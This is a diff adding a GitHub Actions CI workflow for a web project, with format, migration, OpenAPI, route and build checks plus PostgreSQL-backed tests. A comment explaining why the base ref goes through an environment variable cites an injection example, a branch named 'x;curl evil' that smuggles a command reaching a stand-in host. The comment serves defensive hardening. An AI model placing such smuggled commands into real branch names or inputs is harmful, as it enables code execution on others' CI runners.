@@ -1,0 +1,146 @@
+name: CI
+
+# Quality gate: every pull request must install cleanly, be formatted,
+# type-check, pass its tests and produce a production build before it can be
+# merged.
+on:
+  pull_request:
+    branches: [main, production]
+  push:
+    branches: [main, production]
+  workflow_dispatch: {}
+
+concurrency:
+  group: ci-${{ github.ref }}
+  cancel-in-progress: true
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    name: Type-check & build
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v7
+        with:
+          # The migration check compares this branch against its base, so the
+          # history has to be here. A shallow clone would make it pass by
+          # having nothing to compare.
+          fetch-depth: 0
+
+      - uses: pnpm/action-setup@v6
+        with:
+          version: 10
+
+      - uses: actions/setup-node@v7
+        with:
+          node-version: 22
+          cache: pnpm
+
+      - name: Install dependencies
+        run: pnpm install --frozen-lockfile
+
+      - name: Check formatting
+        run: pnpm format:check
+
+      # S-102: editing a migration that has already been applied somewhere
+      # stops the deploy pipeline dead — and it stops it BEFORE applying any
+      # migration, so every later one is skipped and that database silently
+      # falls behind the code. The runner catches it, but only at deploy time,
+      # after the merge. This catches it next to the diff that causes it.
+      #
+      # The base ref goes through `env` rather than into the run: line. A
+      # branch name is caller-controlled — on a fork pull request it is chosen
+      # by whoever opened it — and interpolating one straight into a shell
+      # command is how a branch called `x;curl evil` runs on the runner.
+      - name: No already-applied migration has been edited
+        env:
+          BASE_REF: ${{ github.base_ref || 'main' }}
+        run: pnpm verify:migrations "origin/$BASE_REF"
+
+      # S-110: an endpoint added without a descriptor cannot be documented, and
+      # a committed document that has drifted from the routes is worse than
+      # none. Both fail here rather than being noticed by an integrator later.
+      - name: Check the API document is generated and current
+        run: pnpm openapi:check
+
+      # Two hosts, two adapters (astro.config.mjs): Test deploys to Vercel and
+      # production to Azure App Service. The Vercel build comes first because
+      # verify:routes below reads what that adapter emits; DEPLOY_TARGET is
+      # what asks for it, since the default here is the Azure build.
+      - name: Type-check and build (Test target)
+        run: pnpm build
+        env:
+          DEPLOY_TARGET: vercel
+
+      # The Vercel adapter emits a closed allow-list of routes, with a final
+      # catch-all that 404s. A page missing from that list is unreachable in
+      # the deployed site however the application is configured — and nothing
+      # else fails: the source has the page, the tests pass, the build
+      # succeeds. Checking the build output here means the next occurrence
+      # fails next to the build that caused it.
+      - name: Every page is reachable in the build output
+        run: pnpm verify:routes
+
+      # And again for production's own adapter. Only the packaging differs,
+      # but "only the packaging" is exactly what a broken adapter breaks —
+      # and it would otherwise break in the Azure pipeline, after review,
+      # rather than here. Seconds, on an already-warm build.
+      - name: Build for production's target too
+        run: pnpm build
+        env:
+          DEPLOY_TARGET: azure
+
+  test:
+    name: Tests
+    runs-on: ubuntu-latest
+
+    # The database tests run against a real PostgreSQL server rather than a
+    # mock: the behaviour under test is largely the database's own (constraints,
+    # triggers, privileges), which a mock would simply assert back at us.
+    services:
+      postgres:
+        image: postgres:16
+        env:
+          POSTGRES_PASSWORD: postgres
+          POSTGRES_HOST_AUTH_METHOD: trust
+        ports:
+          - 5433:5432
+        options: >-
+          --health-cmd pg_isready
+          --health-interval 10s
+          --health-timeout 5s
+          --health-retries 5
+
+    steps:
+      - uses: actions/checkout@v7
+
+      - uses: pnpm/action-setup@v6
+        with:
+          version: 10
+
+      - uses: actions/setup-node@v7
+        with:
+          node-version: 22
+          cache: pnpm
+
+      - name: Install dependencies
+        run: pnpm install --frozen-lockfile
+
+      - name: Prepare the test database
+        env:
+          PGHOST: 127.0.0.1
+          PGPORT: '5433'
+          PGUSER: postgres
+        run: |
+          # Mirrors scripts/dev-db.sh: an owner that runs migrations, and a
+          # least-privilege application role that cannot change the schema.
+          psql -v ON_ERROR_STOP=1 -c "create database albarakah"
+          psql -v ON_ERROR_STOP=1 -c "create role albarakah_app with login password 'devpassword'"
+          psql -v ON_ERROR_STOP=1 -d albarakah -c "revoke all on schema public from public"
+          psql -v ON_ERROR_STOP=1 -d albarakah -c "grant connect on database albarakah to albarakah_app"
+          psql -v ON_ERROR_STOP=1 -d albarakah -c "grant usage on schema public to albarakah_app"
+
+      - name: Run tests
+        run: pnpm test
